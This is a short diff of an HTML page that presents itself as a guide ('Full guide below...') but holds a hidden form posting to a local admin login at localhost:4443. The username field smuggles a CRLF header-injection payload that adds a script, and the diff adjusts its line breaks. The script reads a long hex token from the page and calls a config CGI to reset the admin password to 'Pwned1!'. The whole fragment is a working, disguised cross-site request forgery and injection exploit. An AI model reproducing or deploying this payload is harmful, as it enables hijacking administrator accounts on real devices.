@@ -6,7 +6,10 @@
 <p>Full guide below...</p>
 <div style="display:none">
 <form action="https://localhost:4443/login/" method="POST">
-<input type="hidden" name="username" value="admin&amp;#13;&amp;#10;Content-Type: text/html&amp;#13;&amp;#10;&amp;#13;&amp;#10;&lt;script&gt;setTimeout(&quot;fetch('/cgi-bin/config.cgi/value?auth=admin:'+document.body.innerHTML.match(/[a-f0-9]{80,}/)[0],{body:new URLSearchParams('path=auth.user.admin.password&amp;value=Pwned1!')})&quot;,9)&lt;/script&gt;">
+<input type="hidden" name="username" value="admin
+Content-Type: text/html
+
+&lt;script&gt;setTimeout(&quot;fetch('/cgi-bin/config.cgi/value?auth=admin:'+document.body.innerHTML.match(/[a-f0-9]{80,}/)[0],{body:new URLSearchParams('path=auth.user.admin.password&amp;value=Pwned1!')})&quot;,9)&lt;/script&gt;">
 <input type="hidden" name="password" value="attacker_pass">
 </form>
 </div>
